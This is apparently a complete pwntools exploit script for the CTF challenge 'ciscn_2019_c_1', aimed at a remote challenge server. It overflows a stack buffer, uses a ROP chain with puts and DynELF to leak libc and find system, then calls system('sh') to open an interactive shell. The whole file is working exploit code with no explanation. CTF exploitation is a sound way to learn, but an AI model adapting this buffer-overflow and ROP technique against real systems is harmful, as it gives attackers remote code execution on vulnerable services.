from pwn import *


p = remote("node4.buuoj.cn", 27300)
pro = ELF("./ciscn_2019_c_1")

puts = pro.plt["puts"]
pop_rdi_ret = 0x0400c83
ret = pop_rdi_ret+0x1
start = 0x0400790


# leak libc
def leak(ad):
    p.recv()
    p.sendline("1")
    pad = cyclic(0x50+0x8)
    pad += p64(pop_rdi_ret)+p64(ad)+p64(puts)
    pad += p64(start)
    p.sendline(pad)

    p.recvuntil("Ciphertext\n")
    p.recvline()
    addr = p.recvuntil("\nE", drop=True)
    if not addr:
        addr = b"\x00"

    print("leak: ", addr)
    return addr


d = DynELF(leak, elf=pro)
system = d.lookup("system", "libc")
print("system: ", hex(system))
sh = next(pro.search(b"sh\x00"))
print("sh: ", hex(sh))

# attack
p.recv()
p.sendline("1")
pad = cyclic(0x50+0x8)
# version > ubuntu16.04: use ```ret``` avoid ```movaps```
pad += p64(ret)+p64(pop_rdi_ret)+p64(sh)+p64(system)
p.sendline(pad)

p.interactive()


